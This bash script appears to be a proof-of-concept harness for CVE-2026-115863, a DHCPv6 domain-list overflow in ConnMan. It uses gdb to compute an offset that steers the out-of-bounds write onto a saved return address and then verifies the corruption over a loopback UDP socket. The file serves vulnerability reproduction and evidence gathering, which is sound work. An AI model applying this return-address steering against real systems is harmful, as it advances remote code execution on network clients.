#!/bin/bash
# CVE-2026-115863 — return-address steering check over the loopback wire path.
#
# Uses gdb on the plain-build wireloop binary p-loop (built by run.sh). gdb
# follows the forked receiver child. At get_domains() entry it reads dns_name[]
# and the saved frame chain, solves for the K whose first out-of-bounds step
# lands on the saved return-address slot of get_dhcpv6_option_value_list():
#   first OOB offset = 1025 + K; target = caller_rbp + 8.
# K is carried in the REPLY's option-24 value at offset 1024 across a real
# 127.0.0.1 UDP socket. A hardware watchpoint verifies the walk writes 0x2E.
# Five runs with ASLR enabled. K is layout-specific, not universal.
set -u
cd "$(dirname "$0")" || exit 99
[ -x ./p-loop ] || { echo "run ./run.sh first"; exit 99; }
E=evidence
mkdir -p "$E"
rm -f "$E"/retarget-*.out

cat > /tmp/connman-wireloop-retarget.gdb <<'EOF'
set pagination off
set confirm off
set follow-fork-mode child
set detach-on-fork on
set disable-randomization off
break get_domains
run attack 0x80
set $caller_rbp = *(void **)$rbp
set $ret_slot = $caller_rbp + 8
set $k = (unsigned long)$ret_slot - (unsigned long)&dns_name[0] - 1025
printf "LAYOUT DNS=%p RET_SLOT=%p K=%lu\n", &dns_name[0], $ret_slot, $k
quit
EOF
LAYOUT=$(gdb -batch -x /tmp/connman-wireloop-retarget.gdb ./p-loop 2>/dev/null \
         | grep -oE 'LAYOUT DNS=[^ ]+ RET_SLOT=[^ ]+ K=[0-9]+')
[ -n "$LAYOUT" ] || { echo "LAYOUT probe failed"; exit 1; }
K=$(printf '%s\n' "$LAYOUT" | grep -oE 'K=[0-9]+' | cut -d= -f2)
printf '%s\n' "$LAYOUT" | tee "$E/retarget-layout.out"

cat > /tmp/connman-wireloop-retarget-watch.gdb <<EOF
set pagination off
set confirm off
set follow-fork-mode child
set detach-on-fork on
set disable-randomization off
break get_domains
run attack 0x$(printf '%x' "$K")
set \$caller_rbp = *(void **)\$rbp
set \$ret_slot = \$caller_rbp + 8
printf "WATCH RET_SLOT=%p BEFORE=%02x\n", \$ret_slot, *(unsigned char *)\$ret_slot
watch *(unsigned char *)\$ret_slot
continue
printf "WATCH HIT NOW=%02x\n", *(unsigned char *)\$ret_slot
quit
EOF
HITS=0
for n in 1 2 3 4 5; do
	OUT=$(gdb -batch -x /tmp/connman-wireloop-retarget-watch.gdb ./p-loop 2>/dev/null)
	printf '%s\n' "$OUT" > "$E/retarget-$n.out"
	BEFORE=$(printf '%s\n' "$OUT" | grep -oE 'BEFORE=[0-9a-f]+' | cut -d= -f2)
	AFTER=$(printf '%s\n' "$OUT" | grep -oE 'NOW=[0-9a-f]+' | cut -d= -f2)
	printf 'run=%d K=0x%x BEFORE=%s AFTER=%s\n' "$n" "$K" "$BEFORE" "$AFTER"
	[ -n "$BEFORE" ] && [ "$BEFORE" != "2e" ] && [ "$AFTER" = "2e" ] && HITS=$((HITS + 1))
done
printf 'RETARGET_K=0x%x HITS=%d/5\n' "$K" "$HITS" | tee "$E/retarget-summary.out"
[ "$HITS" -eq 5 ]
